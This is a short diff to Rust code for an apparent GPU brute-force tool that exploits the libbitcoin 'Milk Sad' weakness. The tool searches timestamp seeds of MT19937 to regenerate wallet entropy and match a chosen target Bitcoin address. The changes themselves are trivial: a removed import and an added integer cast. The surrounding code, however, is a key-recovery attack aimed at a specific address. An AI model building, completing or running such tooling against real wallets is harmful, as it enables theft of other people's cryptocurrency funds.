@@ -6,7 +6,6 @@ use bitcoin::secp256k1::Secp256k1;
 use bitcoin::bip32::{Xpriv, DerivationPath};
 use bitcoin::{Network, Address};
 use rand_mt::Mt19937GenRand32;
-use rand::{Rng, SeedableRng};
 
 /// Libbitcoin "Milk Sad" Vulnerability (100% GPU)
 /// MT19937 seeded with unix timestamp (seconds)
@@ -81,7 +80,7 @@ pub fn run_with_target(target: String, start_ts_opt: Option<u32>, end_ts_opt: Op
             println!("\n[GPU] Found {} potential candidates. Verifying...", results.len());
             for timestamp in results {
                 // Verify on CPU (index 0)
-                let entropy = generate_milk_sad_entropy(timestamp);
+                let entropy = generate_milk_sad_entropy(timestamp as u32);
                 let derived_address = generate_address_from_entropy(&entropy, 0);
                 
                 if derived_address == target {
